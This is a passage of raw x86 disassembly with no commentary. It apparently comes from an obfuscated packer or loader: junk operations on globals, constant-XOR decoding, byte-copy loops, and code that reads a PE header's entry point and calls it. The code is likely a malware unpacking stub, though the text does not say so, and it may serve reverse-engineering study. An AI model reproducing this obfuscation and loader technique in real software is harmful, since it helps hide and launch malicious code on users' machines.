  419236:	mov    DWORD PTR ds:0x421a52,0xf89c85b5
  419240:	pop    ebp
  419241:	jmp    0x4193b5
  419246:	push   ebp
  419247:	mov    ebp,esp
  419249:	push   ecx
  41924a:	and    DWORD PTR ds:0x42c010,0x0
  419254:	jmp    0x419266
  419259:	mov    edx,DWORD PTR ds:0x42c010
  41925f:	inc    edx
  419260:	mov    DWORD PTR ds:0x42c010,edx
  419266:	cmp    DWORD PTR ds:0x42c010,0x19
  41926d:	jae    0x4192ae
  419273:	cmp    DWORD PTR ds:0x42c010,0x9
  41927a:	jne    0x419289
  419280:	push   DWORD PTR [ebp-0x18]
  419283:	call   DWORD PTR ds:0x42401c
  419289:	cmp    DWORD PTR ds:0x42c010,0x8
  419290:	jne    0x4192a3
  419296:	mov    edx,DWORD PTR ds:0x42c010
  41929c:	inc    edx
  41929d:	mov    DWORD PTR ds:0x42c010,edx
  4192a3:	jmp    0x419259
  4192a8:	or     DWORD PTR ds:0x42c004,ebx
  4192ae:	push   ecx
  4192af:	movzx  eax,BYTE PTR ds:0x42b00c
  4192b6:	and    DWORD PTR ds:0x42a01c,eax
  4192bc:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4192c3:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4192ca:	mov    DWORD PTR ds:0x428008,0x13
  4192d4:	cmp    DWORD PTR ds:0x428008,0x0
  4192db:	je     0x41930a
  4192e1:	cmp    DWORD PTR ds:0x428008,0x20
  4192e8:	jne    0x4192fa
  4192ee:	push   DWORD PTR [ebp-0x14]
  4192f1:	push   DWORD PTR [ebp-0x1c]
  4192f4:	call   DWORD PTR ds:0x424020
  4192fa:	mov    eax,ds:0x428008
  4192ff:	dec    eax
  419300:	mov    ds:0x428008,eax
  419305:	jmp    0x4192d4
  41930a:	mov    eax,DWORD PTR [ebp-0x4]
  41930d:	and    DWORD PTR ds:0x429008,0x428020
  419317:	push   esi
  419318:	adc    DWORD PTR ds:0x42c000,0x1310
  419322:	mov    esi,DWORD PTR [ebp-0x8]
  419325:	mov    edx,0x7510893
  41932a:	xor    eax,edx
  41932c:	mov    ecx,DWORD PTR ds:0x42a000
  419332:	and    DWORD PTR ds:0x429014,ecx
  419338:	xor    esi,edx
  41933a:	mov    ecx,DWORD PTR ds:0x42379d
  419340:	mov    ecx,DWORD PTR [ecx]
  419342:	sbb    DWORD PTR ds:0x42b00c,ecx
  419348:	mov    ecx,0x3272db
  41934d:	add    esi,ecx
  41934f:	add    eax,ecx
  419351:	imul   eax,esi
  419354:	mov    esi,DWORD PTR [ebp+0xc]
  419357:	cmp    esi,eax
  419359:	jne    0x419375
  41935f:	mov    eax,DWORD PTR [ebp-0x4]
  419362:	mov    esi,DWORD PTR [ebp-0x8]
  419365:	xor    eax,edx
  419367:	xor    esi,edx
  419369:	add    eax,ecx
  41936b:	add    esi,ecx
  41936d:	imul   eax,esi
  419370:	jmp    0x4193b0
  419375:	mov    eax,DWORD PTR [ebp+0xc]
  419378:	mov    eax,DWORD PTR [eax+0x78]
  41937b:	mov    DWORD PTR [ebp+0xc],eax
  41937e:	mov    eax,DWORD PTR [ebp-0x4]
  419381:	mov    esi,DWORD PTR [ebp-0x8]
  419384:	xor    eax,edx
  419386:	xor    esi,edx
  419388:	add    eax,ecx
  41938a:	add    esi,ecx
  41938c:	imul   eax,esi
  41938f:	mov    esi,DWORD PTR [ebp+0xc]
  419392:	cmp    esi,eax
  419394:	mov    eax,DWORD PTR [ebp-0x4]
  419397:	je     0x419362
  41939d:	xor    eax,edx
  41939f:	add    eax,ecx
  4193a1:	mov    ecx,DWORD PTR [ebp+0xc]
  4193a4:	imul   eax,ecx
  4193a7:	add    eax,DWORD PTR [ebp+0x8]
  4193aa:	mov    DWORD PTR [ebp+0xc],eax
  4193ad:	mov    eax,DWORD PTR [ebp+0xc]
  4193b0:	pop    esi
  4193b1:	leave  
  4193b2:	ret    0x8
  4193b5:	push   ebp
  4193b6:	mov    ebp,esp
  4193b8:	sub    esp,0x80
  4193be:	push   ebx
  4193bf:	push   esi
  4193c0:	push   edi
  4193c1:	mov    DWORD PTR ds:0x42c010,0xf9a
  4193cb:	mov    DWORD PTR [ebp-0x3c],0x0
  4193d2:	dec    eax
  4193d3:	mov    eax,DWORD PTR [ebp-0x18]
  4193d6:	mov    DWORD PTR [ebp-0x18],eax
  4193d9:	adc    DWORD PTR ds:0x429014,0x42801c
  4193e3:	push   0x421a56
  4193e8:	call   DWORD PTR ds:0x42402c
  4193ee:	adc    DWORD PTR ds:0x428018,0x3fb
  4193f8:	push   0x0
  4193fa:	push   0x67
  4193fc:	sbb    DWORD PTR ds:0x42b008,0x4024
  419406:	push   0xc
  419408:	mov    DWORD PTR ds:0x429000,0x5718
  419412:	push   0x3
  419414:	and    DWORD PTR ds:0x42b004,0x67ab
  41941e:	push   0x2
  419420:	push   0x78769798
  419425:	or     DWORD PTR ds:0x428024,0x42c014
  41942f:	call   DWORD PTR ds:0x42400c
  419435:	or     DWORD PTR ds:0x42c000,0x429014
  41943f:	push   0x57658733
  419444:	and    DWORD PTR ds:0x42c000,0x42900c
  41944e:	call   DWORD PTR ds:0x424008
  419454:	push   0x97667654
  419459:	call   DWORD PTR ds:0x424000
  41945f:	movzx  ebx,BYTE PTR ds:0x428004
  419466:	mov    eax,DWORD PTR [ebp-0x18]
  419469:	mov    ebx,0xf89c85b6
  41946e:	mov    DWORD PTR ds:0x42c018,0x6f46
  419478:	cmp    eax,ebx
  41947a:	mov    DWORD PTR ds:0x42c010,0x6381
  419484:	jne    0x4194d6
  41948a:	mov    DWORD PTR ds:0x421a52,0xf89c85b5
  419494:	adc    DWORD PTR ds:0x42a000,0x42801c
  41949e:	push   DWORD PTR [ebp+0x10]
  4194a1:	and    DWORD PTR ds:0x42a00c,0x42c00c
  4194ab:	push   DWORD PTR [ebp+0xc]
  4194ae:	push   DWORD PTR [ebp+0x8]
  4194b1:	or     DWORD PTR ds:0x42b008,0x5d49
  4194bb:	call   0x419233
  4194c0:	xor    DWORD PTR ds:0x42b018,ebx
  4194c6:	mov    ecx,DWORD PTR ds:0x421942
  4194cc:	or     esi,edi
  4194ce:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4194d4:	mov    DWORD PTR [ecx],eax
  4194d6:	mov    DWORD PTR [ebp-0x4],ebx
  4194d9:	sub    ecx,0x68bb
  4194df:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4194e6:	lea    eax,[ebp-0x44]
  4194e9:	mov    DWORD PTR [ebp-0x3c],eax
  4194ec:	adc    ecx,esi
  4194ee:	lea    eax,[ebp-0x48]
  4194f1:	not    DWORD PTR ds:0x42b008
  4194f7:	mov    DWORD PTR [ebp-0x24],eax
  4194fa:	mov    ecx,DWORD PTR ds:0x423799
  419500:	mov    esi,DWORD PTR ds:0x42177a
  419506:	sub    esi,ecx
  419508:	and    ecx,DWORD PTR [ecx+esi*1]
  41950b:	mov    eax,ds:0x421942
  419510:	mov    eax,DWORD PTR [eax+0x1c8]
  419516:	mov    eax,DWORD PTR [eax]
  419518:	and    edi,0x1f5e
  41951e:	mov    ecx,DWORD PTR [ebp-0x24]
  419521:	mov    esi,0x7510893
  419526:	xor    eax,esi
  419528:	mov    edi,0x3272db
  41952d:	add    eax,edi
  41952f:	mov    DWORD PTR ds:0x42b00c,0x7d8f
  419539:	mov    DWORD PTR [ecx],eax
  41953b:	mov    DWORD PTR ds:0x42a01c,0x3f3b
  419545:	mov    eax,ds:0x421b5e
  41954a:	mov    DWORD PTR ds:0x42b000,0x7292
  419554:	cmp    eax,0x301ac8f5
  419559:	mov    DWORD PTR ds:0x42a000,0x7d07
  419563:	jne    0x419756
  419569:	or     DWORD PTR ds:0x42a00c,0x42c008
  419573:	mov    eax,DWORD PTR [ebp-0x4]
  419576:	mov    DWORD PTR ds:0x42b008,0x18
  419580:	cmp    DWORD PTR ds:0x42b008,0x0
  419587:	je     0x4195f4
  41958d:	cmp    DWORD PTR ds:0x42b008,0x7
  419594:	jne    0x4195c4
  41959a:	push   0x42b018
  41959f:	push   0x1cad
  4195a4:	push   0x4fac
  4195a9:	push   0x428000
  4195ae:	push   0x3aa1
  4195b3:	push   0x4234ce
  4195b8:	push   DWORD PTR [ebp-0x10]
  4195bb:	push   DWORD PTR [ebp-0x14]
  4195be:	call   DWORD PTR ds:0x424024
  4195c4:	cmp    DWORD PTR ds:0x42b008,0x8
  4195cb:	jne    0x4195de
  4195d1:	mov    edx,DWORD PTR ds:0x42b008
  4195d7:	dec    edx
  4195d8:	mov    DWORD PTR ds:0x42b008,edx
  4195de:	xor    edx,edx
  4195e0:	or     edx,DWORD PTR ds:0x42b008
  4195e6:	dec    edx
  4195e7:	mov    DWORD PTR ds:0x42b008,edx
  4195ed:	jmp    0x419580
  4195f2:	sbb    ecx,ecx
  4195f4:	mov    ecx,DWORD PTR ds:0x421942
  4195fa:	and    DWORD PTR ds:0x42c004,0xdaf
  419604:	mov    ecx,DWORD PTR [ecx+0x198]
  41960a:	movzx  edx,WORD PTR ds:0x42c014
  419611:	add    DWORD PTR ds:0x42b018,edx
  419617:	xor    eax,esi
  419619:	add    eax,edi
  41961b:	and    DWORD PTR ds:0x42801c,0x0
  419625:	xor    edx,edx
  419627:	or     edx,DWORD PTR ds:0x42801c
  41962d:	inc    edx
  41962e:	mov    DWORD PTR ds:0x42801c,edx
  419634:	cmp    DWORD PTR ds:0x42801c,0x8
  41963b:	jne    0x419654
  419641:	push   0x4705
  419646:	push   0x5b08
  41964b:	push   DWORD PTR [ebp-0x18]
  41964e:	call   DWORD PTR ds:0x424028
  419654:	cmp    DWORD PTR ds:0x42801c,0x7
  41965b:	jne    0x41966e
  419661:	mov    edx,DWORD PTR ds:0x42801c
  419667:	inc    edx
  419668:	mov    DWORD PTR ds:0x42801c,edx
  41966e:	cmp    DWORD PTR ds:0x42801c,0x18
  419675:	jb     0x419625
  41967b:	mov    edx,DWORD PTR ds:0x421772
  419681:	mov    edx,DWORD PTR [edx]
  419683:	and    DWORD PTR ds:0x42b000,edx
  419689:	mov    DWORD PTR [ecx],eax
  41968b:	adc    ecx,eax
  41968d:	mov    eax,DWORD PTR [ebp-0x4]
  419690:	xor    eax,esi
  419692:	mov    DWORD PTR ds:0x42a004,0x12
  41969c:	cmp    DWORD PTR ds:0x42a004,0x0
  4196a3:	je     0x4196fe
  4196a9:	cmp    DWORD PTR ds:0x42a004,0x4
  4196b0:	jne    0x4196c6
  4196b6:	push   0x4235f4
  4196bb:	push   0x42356f
  4196c0:	call   DWORD PTR ds:0x424030
  4196c6:	cmp    DWORD PTR ds:0x42a004,0x5
  4196cd:	jne    0x4196e2
  4196d3:	xor    edx,edx
  4196d5:	add    edx,DWORD PTR ds:0x42a004
  4196db:	dec    edx
  4196dc:	mov    DWORD PTR ds:0x42a004,edx
  4196e2:	mov    edx,DWORD PTR ds:0x42a004
  4196e8:	dec    edx
  4196e9:	mov    DWORD PTR ds:0x42a004,edx
  4196ef:	jmp    0x41969c
  4196f4:	or     DWORD PTR ds:0x42b000,0x2eb5
  4196fe:	add    eax,edi
  419700:	and    DWORD PTR ds:0x428000,0x0
  41970a:	xor    ecx,ecx
  41970c:	or     ecx,DWORD PTR ds:0x428000
  419712:	inc    ecx
  419713:	mov    DWORD PTR ds:0x428000,ecx
  419719:	cmp    DWORD PTR ds:0x428000,0x26
  419720:	jne    0x419744
  419726:	push   DWORD PTR [ebp-0x1c]
  419729:	push   0x2787
  41972e:	push   DWORD PTR [ebp-0x20]
  419731:	push   DWORD PTR [ebp-0xc]
  419734:	push   0x458b
  419739:	push   0x42a000
  41973e:	call   DWORD PTR ds:0x424038
  419744:	cmp    DWORD PTR ds:0x428000,0x1e
  41974b:	jb     0x41970a
  419751:	mov    ds:0x421b5e,eax
  419756:	and    DWORD PTR ds:0x42a004,0x0
  419760:	xor    ecx,ecx
  419762:	xor    ecx,DWORD PTR ds:0x42a004
  419768:	inc    ecx
  419769:	mov    DWORD PTR ds:0x42a004,ecx
  41976f:	cmp    DWORD PTR ds:0x42a004,0x7
  419776:	jne    0x41978c
  41977c:	push   0x429018
  419781:	push   0x457c
  419786:	call   DWORD PTR ds:0x42403c
  41978c:	cmp    DWORD PTR ds:0x42a004,0x6
  419793:	jne    0x4197a6
  419799:	mov    ecx,DWORD PTR ds:0x42a004
  41979f:	inc    ecx
  4197a0:	mov    DWORD PTR ds:0x42a004,ecx
  4197a6:	cmp    DWORD PTR ds:0x42a004,0x1c
  4197ad:	jb     0x419760
  4197b3:	adc    edx,ecx
  4197b5:	mov    eax,ds:0x421942
  4197ba:	mov    eax,DWORD PTR [eax+0x18c]
  4197c0:	mov    eax,DWORD PTR [eax]
  4197c2:	mov    DWORD PTR [ebp-0x4c],eax
  4197c5:	xor    edx,edx
  4197c7:	add    edx,DWORD PTR ds:0x4237a9
  4197cd:	mov    eax,ds:0x42176e
  4197d2:	sub    eax,edx
  4197d4:	add    edx,DWORD PTR [edx+eax*1]
  4197d7:	mov    ecx,0xf89c85ba
  4197dc:	not    DWORD PTR ds:0x42b018
  4197e2:	mov    DWORD PTR [ebp-0x38],ecx
  4197e5:	mov    DWORD PTR [ebp-0x38],ecx
  4197e8:	neg    eax
  4197ea:	mov    DWORD PTR [ebp-0x38],ecx
  4197ed:	sbb    DWORD PTR ds:0x42a01c,0x6a2c
  4197f7:	mov    DWORD PTR [ebp-0x30],ebx
  4197fa:	sbb    ebx,ebx
  4197fc:	mov    DWORD PTR [ebp-0x38],ecx
  4197ff:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  419806:	and    DWORD PTR ds:0x42800c,0x0
  419810:	jmp    0x419822
  419815:	mov    edx,DWORD PTR ds:0x42800c
  41981b:	inc    edx
  41981c:	mov    DWORD PTR ds:0x42800c,edx
  419822:	cmp    DWORD PTR ds:0x42800c,0x1c
  419829:	jae    0x419869
  41982f:	cmp    DWORD PTR ds:0x42800c,0x10
  419836:	jne    0x41984a
  41983c:	push   DWORD PTR [ebp-0x20]
  41983f:	push   0x4235ea
  419844:	call   DWORD PTR ds:0x424040
  41984a:	cmp    DWORD PTR ds:0x42800c,0xf
  419851:	jne    0x419864
  419857:	mov    edx,DWORD PTR ds:0x42800c
  41985d:	inc    edx
  41985e:	mov    DWORD PTR ds:0x42800c,edx
  419864:	jmp    0x419815
  419869:	mov    eax,DWORD PTR [ebp-0x4]
  41986c:	mov    edx,DWORD PTR [ebp-0x8]
  41986f:	inc    ebx
  419870:	mov    ebx,DWORD PTR [ebp-0x8]
  419873:	sub    DWORD PTR ds:0x42b008,0x42800c
  41987d:	xor    ebx,esi
  41987f:	xor    edx,esi
  419881:	and    DWORD PTR ds:0x42a010,0x42b01c
  41988b:	add    edx,ebx
  41988d:	and    DWORD PTR ds:0x42a01c,0x0
  419897:	jmp    0x4198ab
  41989c:	xor    ebx,ebx
  41989e:	add    ebx,DWORD PTR ds:0x42a01c
  4198a4:	inc    ebx
  4198a5:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ab:	cmp    DWORD PTR ds:0x42a01c,0x12
  4198b2:	jae    0x4198fd
  4198b8:	cmp    DWORD PTR ds:0x42a01c,0x8
  4198bf:	jne    0x4198d0
  4198c5:	push   0x423554
  4198ca:	call   DWORD PTR ds:0x424044
  4198d0:	cmp    DWORD PTR ds:0x42a01c,0x7
  4198d7:	jne    0x4198ea
  4198dd:	mov    ebx,DWORD PTR ds:0x42a01c
  4198e3:	inc    ebx
  4198e4:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ea:	jmp    0x41989c
  4198ef:	xor    ebx,ebx
  4198f1:	xor    ebx,DWORD PTR ds:0x42900c
  4198f7:	add    DWORD PTR ds:0x429000,ebx
  4198fd:	mov    ebx,DWORD PTR [ebp-0x8]
  419900:	sub    DWORD PTR ds:0x42900c,0x42800c
  41990a:	xor    ebx,esi
  41990c:	or     DWORD PTR ds:0x428000,0x42a00c
  419916:	xor    eax,esi
  419918:	add    eax,edi
  41991a:	mov    DWORD PTR ds:0x42b01c,0x7433
  419924:	lea    edx,[edx+ebx*1+0x975891]
  41992b:	mov    ebx,0x12a1
  419930:	mov    DWORD PTR [ebp-0x14],eax
  419933:	mov    ebx,0x8a29a123
  419938:	cmp    eax,edx
  41993a:	ja     0x419b96
  419940:	or     ecx,0x8d6
  419946:	mov    ecx,DWORD PTR [ebp-0x8]
  419949:	add    DWORD PTR ds:0x428018,ebx
  41994f:	xor    ecx,esi
  419951:	lea    ecx,[ecx+eax*1+0x3272db]
  419958:	add    DWORD PTR ds:0x429018,0x73bd
  419962:	mov    DWORD PTR [ebp-0x10],ecx
  419965:	adc    DWORD PTR ds:0x42c00c,ecx
  41996b:	mov    ecx,DWORD PTR [ebp-0x30]
  41996e:	inc    edx
  41996f:	xor    ecx,esi
  419971:	lea    ecx,[ebp+ecx*1+0x3272e3]
  419978:	xor    edx,edx
  41997a:	add    edx,DWORD PTR ds:0x42174e
  419980:	mov    edx,DWORD PTR [edx]
  419982:	or     DWORD PTR ds:0x42a008,edx
  419988:	mov    DWORD PTR [ebp-0x38],ecx
  41998b:	mov    ecx,DWORD PTR ds:0x421942
  419991:	mov    ecx,DWORD PTR [ecx+0x1bc]
  419997:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41999e:	mov    DWORD PTR ds:0x42b01c,0x13
  4199a8:	cmp    DWORD PTR ds:0x42b01c,0x0
  4199af:	je     0x4199ef
  4199b5:	cmp    DWORD PTR ds:0x42b01c,0x20
  4199bc:	jne    0x4199d7
  4199c2:	push   0x32fe
  4199c7:	push   0x42b000
  4199cc:	push   0x42374e
  4199d1:	call   DWORD PTR ds:0x424048
  4199d7:	mov    edx,DWORD PTR ds:0x42b01c
  4199dd:	dec    edx
  4199de:	mov    DWORD PTR ds:0x42b01c,edx
  4199e4:	jmp    0x4199a8
  4199e9:	dec    DWORD PTR ds:0x428020
  4199ef:	mov    DWORD PTR [ebp-0x34],ecx
  4199f2:	adc    DWORD PTR ds:0x42a004,ebx
  4199f8:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  4199ff:	adc    edx,edx
  419a01:	mov    ecx,DWORD PTR [ebp-0xc]
  419a04:	mov    edx,DWORD PTR ds:0x428024
  419a0a:	sbb    DWORD PTR ds:0x42c018,edx
  419a10:	mov    edx,DWORD PTR [ebp-0x10]
  419a13:	xor    ecx,esi
  419a15:	sbb    DWORD PTR ds:0x42b014,0x42b008
  419a1f:	add    ecx,edi
  419a21:	cmp    ecx,edx
  419a23:	mov    DWORD PTR ds:0x429004,0x1818
  419a2d:	je     0x419b62
  419a33:	mov    eax,DWORD PTR [ebp-0xc]
  419a36:	mov    DWORD PTR ds:0x428024,0x1374
  419a40:	mov    ecx,DWORD PTR [ebp-0x10]
  419a43:	xor    edx,edx
  419a45:	or     DWORD PTR ds:0x428008,0x428020
  419a4f:	xor    eax,esi
  419a51:	sub    DWORD PTR ds:0x42b004,0x42a008
  419a5b:	add    eax,edi
  419a5d:	sbb    DWORD PTR ds:0x42c018,0x42c014
  419a67:	add    ecx,0xfabdbef1
  419a6d:	adc    edx,0xffffffff
  419a70:	xor    ecx,ebx
  419a72:	sbb    DWORD PTR ds:0x42a010,0x42800c
  419a7c:	xor    edx,0x0
  419a7f:	mov    DWORD PTR [ebp-0x68],ecx
  419a82:	mov    ecx,DWORD PTR ds:0x42c014
  419a88:	or     DWORD PTR ds:0x42a008,ecx
  419a8e:	mov    DWORD PTR [ebp-0x64],edx
  419a91:	xor    edx,edx
  419a93:	mov    ecx,eax
  419a95:	add    ecx,0xfabdbef1
  419a9b:	adc    edx,0xffffffff
  419a9e:	xor    ecx,ebx
  419aa0:	xor    edx,0x0
  419aa3:	mov    DWORD PTR ds:0x42b008,0x242f
  419aad:	mov    DWORD PTR [ebp-0x24],eax
  419ab0:	mov    DWORD PTR ds:0x428018,0x30e6
  419aba:	mov    DWORD PTR [ebp-0x74],edx
  419abd:	mov    DWORD PTR ds:0x428018,0xdc5
  419ac7:	cmp    ecx,DWORD PTR [ebp-0x68]
  419aca:	jne    0x419ae5
  419ad0:	mov    ecx,DWORD PTR [ebp-0x64]
  419ad3:	cmp    edx,ecx
  419ad5:	mov    DWORD PTR ds:0x429004,0x231e
  419adf:	je     0x419b5f
  419ae5:	mov    ecx,DWORD PTR [ebp-0xc]
  419ae8:	mov    edx,DWORD PTR [ebp-0x20]
  419aeb:	xor    edx,esi
  419aed:	add    edx,edi
  419aef:	imul   edx,eax
  419af2:	xor    ecx,esi
  419af4:	add    ecx,eax
  419af6:	mov    eax,DWORD PTR [ebp-0x34]
  419af9:	mov    ebx,DWORD PTR [ebp-0x38]
  419afc:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419b03:	mov    BYTE PTR [edx+eax*1],cl
  419b06:	mov    eax,DWORD PTR [ebp-0x20]
  419b09:	mov    ecx,DWORD PTR [ebp-0x24]
  419b0c:	xor    eax,esi
  419b0e:	lea    eax,[ecx+eax*1+0x3272db]
  419b15:	mov    ecx,DWORD PTR [ebp-0x10]
  419b18:	xor    edx,edx
  419b1a:	add    ecx,0xfabdbef1
  419b20:	adc    edx,0xffffffff
  419b23:	xor    edx,0x0
  419b26:	mov    ebx,0x8a29a123
  419b2b:	xor    ecx,ebx
  419b2d:	mov    DWORD PTR [ebp-0x70],ecx
  419b30:	mov    DWORD PTR [ebp-0x6c],edx
  419b33:	xor    edx,edx
  419b35:	mov    ecx,eax
  419b37:	add    ecx,0xfabdbef1
  419b3d:	adc    edx,0xffffffff
  419b40:	xor    ecx,ebx
  419b42:	xor    edx,0x0
  419b45:	mov    DWORD PTR [ebp-0x24],eax
  419b48:	mov    DWORD PTR [ebp-0x7c],edx
  419b4b:	cmp    ecx,DWORD PTR [ebp-0x70]
  419b4e:	jne    0x419ae5
  419b54:	mov    ecx,DWORD PTR [ebp-0x6c]
  419b57:	cmp    edx,ecx
  419b59:	jne    0x419ae5
  419b5f:	mov    eax,DWORD PTR [ebp-0x14]
  419b62:	mov    ecx,DWORD PTR [ebp-0x8]
  419b65:	xor    ecx,esi
  419b67:	lea    eax,[eax+ecx*1+0x3272db]
  419b6e:	mov    ecx,DWORD PTR [ebp-0x8]
  419b71:	mov    edx,DWORD PTR [ebp-0x8]
  419b74:	xor    edx,esi
  419b76:	xor    ecx,esi
  419b78:	add    ecx,edx
  419b7a:	mov    edx,DWORD PTR [ebp-0x8]
  419b7d:	xor    edx,esi
  419b7f:	lea    ecx,[ecx+edx*1+0x975891]
  419b86:	mov    DWORD PTR [ebp-0x14],eax
  419b89:	cmp    eax,ecx
  419b8b:	jbe    0x419940
  419b91:	mov    ecx,0xf89c85ba
  419b96:	mov    eax,DWORD PTR [ebp+0xc]
  419b99:	mov    ds:0x4217c6,eax
  419b9e:	mov    eax,DWORD PTR [ebp+0x10]
  419ba1:	mov    ds:0x421a1a,eax
  419ba6:	mov    eax,ds:0x4217c6
  419bab:	mov    edx,DWORD PTR [ebp-0x3c]
  419bae:	sub    eax,edi
  419bb0:	xor    eax,esi
  419bb2:	mov    DWORD PTR [edx],eax
  419bb4:	mov    eax,DWORD PTR [ebp-0x18]
  419bb7:	cmp    eax,0xf89c85b6
  419bbc:	jne    0x419be7
  419bc2:	lea    eax,[ebp-0x28]
  419bc5:	mov    DWORD PTR [ebp-0x40],eax
  419bc8:	lea    eax,[ebp+0x4]
  419bcb:	mov    DWORD PTR [ebp-0x28],eax
  419bce:	mov    eax,DWORD PTR [ebp-0x28]
  419bd1:	test   eax,eax
  419bd3:	je     0x419cff
  419bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  419bdc:	mov    eax,DWORD PTR [ebp-0x8]
  419bdf:	lea    eax,[ebp-0x40]
  419be2:	jmp    0x419cf6
  419be7:	mov    eax,DWORD PTR [ebp-0x44]
  419bea:	cmp    eax,0xf89c85b5
  419bef:	je     0x419c4c
  419bf5:	mov    eax,DWORD PTR [ebp-0x4]
  419bf8:	mov    edx,DWORD PTR [ebp-0x48]
  419bfb:	xor    eax,esi
  419bfd:	add    eax,edi
  419bff:	cmp    eax,edx
  419c01:	je     0x419c4c
  419c07:	mov    eax,ds:0x421942
  419c0c:	mov    eax,DWORD PTR [eax+0x194]
  419c12:	mov    ecx,DWORD PTR [eax]
  419c14:	mov    eax,DWORD PTR [ecx+0x3c]
  419c17:	push   DWORD PTR ds:0x421a1a
  419c1d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  419c21:	push   DWORD PTR ds:0x4217c6
  419c27:	add    eax,ecx
  419c29:	mov    ecx,DWORD PTR ds:0x421942
  419c2f:	mov    ecx,DWORD PTR [ecx+0x194]
  419c35:	push   DWORD PTR [ecx]
  419c37:	call   eax
  419c39:	mov    ecx,DWORD PTR ds:0x421942
  419c3f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  419c45:	mov    DWORD PTR [ecx],eax
  419c47:	jmp    0x419cff
  419c4c:	mov    eax,DWORD PTR [ebp-0x4]
  419c4f:	mov    edx,DWORD PTR [ebp-0x4c]
  419c52:	xor    eax,esi
  419c54:	add    eax,edi
  419c56:	cmp    eax,edx
  419c58:	jne    0x419cb5
  419c5e:	mov    eax,DWORD PTR [ebp-0x4]
  419c61:	mov    edx,DWORD PTR ds:0x421942
  419c67:	mov    edx,DWORD PTR [edx+0x198]
  419c6d:	xor    eax,esi
  419c6f:	add    eax,edi
  419c71:	cmp    eax,DWORD PTR [edx]
  419c73:	jne    0x419c92
  419c79:	mov    eax,DWORD PTR [ebp-0x4]
  419c7c:	push   0xf89c85b6
  419c81:	xor    eax,esi
  419c83:	add    eax,edi
  419c85:	push   eax
  419c86:	push   ecx
  419c87:	push   DWORD PTR [ebp-0x8]
  419c8a:	push   DWORD PTR [ebp-0x4]
  419c8d:	call   0x408b5c
  419c92:	push   DWORD PTR [ebp-0x8]
  419c95:	push   DWORD PTR [ebp-0x4]
  419c98:	call   0x4091f8
  419c9d:	mov    eax,DWORD PTR [ebp-0x4]
  419ca0:	xor    eax,esi
  419ca2:	add    eax,edi
  419ca4:	mov    ds:0x4219c6,eax
  419ca9:	mov    eax,DWORD PTR [ebp-0x4]
  419cac:	xor    eax,esi
  419cae:	add    eax,edi
  419cb0:	mov    ds:0x4219be,eax
  419cb5:	lea    eax,[ebp-0x2c]
  419cb8:	mov    DWORD PTR [ebp-0x50],eax
  419cbb:	lea    eax,[ebp+0x4]
  419cbe:	mov    DWORD PTR [ebp-0x2c],eax
  419cc1:	mov    eax,DWORD PTR [ebp-0x2c]
  419cc4:	test   eax,eax
  419cc6:	je     0x419cff
  419ccc:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  419cd3:	mov    DWORD PTR [ebp-0x58],0x712ed08
  419cda:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  419ce1:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  419ce8:	call   0x401000
  419ced:	mov    eax,DWORD PTR [ebp-0x1c]
  419cf0:	mov    eax,DWORD PTR [ebp-0x8]
  419cf3:	lea    eax,[ebp-0x50]
  419cf6:	push   eax
  419cf7:	push   DWORD PTR [ebp-0x4]
  419cfa:	call   0x40883f
  419cff:	mov    eax,ds:0x421942
  419d04:	add    eax,0x1cc
  419d09:	mov    DWORD PTR [ebp-0x38],eax
  419d0c:	lea    eax,[ebp-0x1c]
  419d0f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  419d16:	mov    DWORD PTR [ebp-0x3c],eax
  419d19:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  419d20:	mov    eax,DWORD PTR [ebp+0xc]
  419d23:	xor    eax,esi
  419d25:	mov    DWORD PTR [ebp+0x10],0x4
  419d2c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d2f:	add    eax,edi
  419d31:	cmp    eax,ecx
  419d33:	je     0x419df4
  419d39:	mov    eax,DWORD PTR [ebp+0xc]
  419d3c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d3f:	xor    edx,edx
  419d41:	xor    eax,esi
  419d43:	add    eax,edi
  419d45:	add    ecx,0xfabdbef1
  419d4b:	adc    edx,0xffffffff
  419d4e:	xor    ecx,ebx
  419d50:	xor    edx,0x0
  419d53:	mov    DWORD PTR [ebp-0x70],ecx
  419d56:	mov    DWORD PTR [ebp-0x6c],edx
  419d59:	xor    edx,edx
  419d5b:	mov    ecx,eax
  419d5d:	add    ecx,0xfabdbef1
  419d63:	adc    edx,0xffffffff
  419d66:	xor    ecx,ebx
  419d68:	xor    edx,0x0
  419d6b:	mov    DWORD PTR [ebp-0x20],eax
  419d6e:	cmp    ecx,DWORD PTR [ebp-0x70]
  419d71:	jne    0x419d80
  419d77:	cmp    edx,DWORD PTR [ebp-0x6c]
  419d7a:	je     0x419df4
  419d80:	mov    ecx,DWORD PTR [ebp+0xc]
  419d83:	mov    edx,DWORD PTR [ebp-0x24]
  419d86:	xor    edx,esi
  419d88:	xor    ecx,esi
  419d8a:	add    ecx,eax
  419d8c:	add    edx,edi
  419d8e:	imul   edx,eax
  419d91:	mov    eax,DWORD PTR [ebp-0x3c]
  419d94:	mov    ebx,DWORD PTR [ebp-0x38]
  419d97:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419d9e:	mov    BYTE PTR [edx+eax*1],cl
  419da1:	mov    eax,DWORD PTR [ebp-0x24]
  419da4:	mov    ecx,DWORD PTR [ebp-0x20]
  419da7:	mov    edx,DWORD PTR [ebp+0x10]
  419daa:	xor    eax,esi
  419dac:	lea    eax,[ecx+eax*1+0x3272db]
  419db3:	xor    ecx,ecx
  419db5:	add    edx,0xfabdbef1
  419dbb:	adc    ecx,0xffffffff
  419dbe:	xor    ecx,0x0
  419dc1:	mov    DWORD PTR [ebp-0x7c],ecx
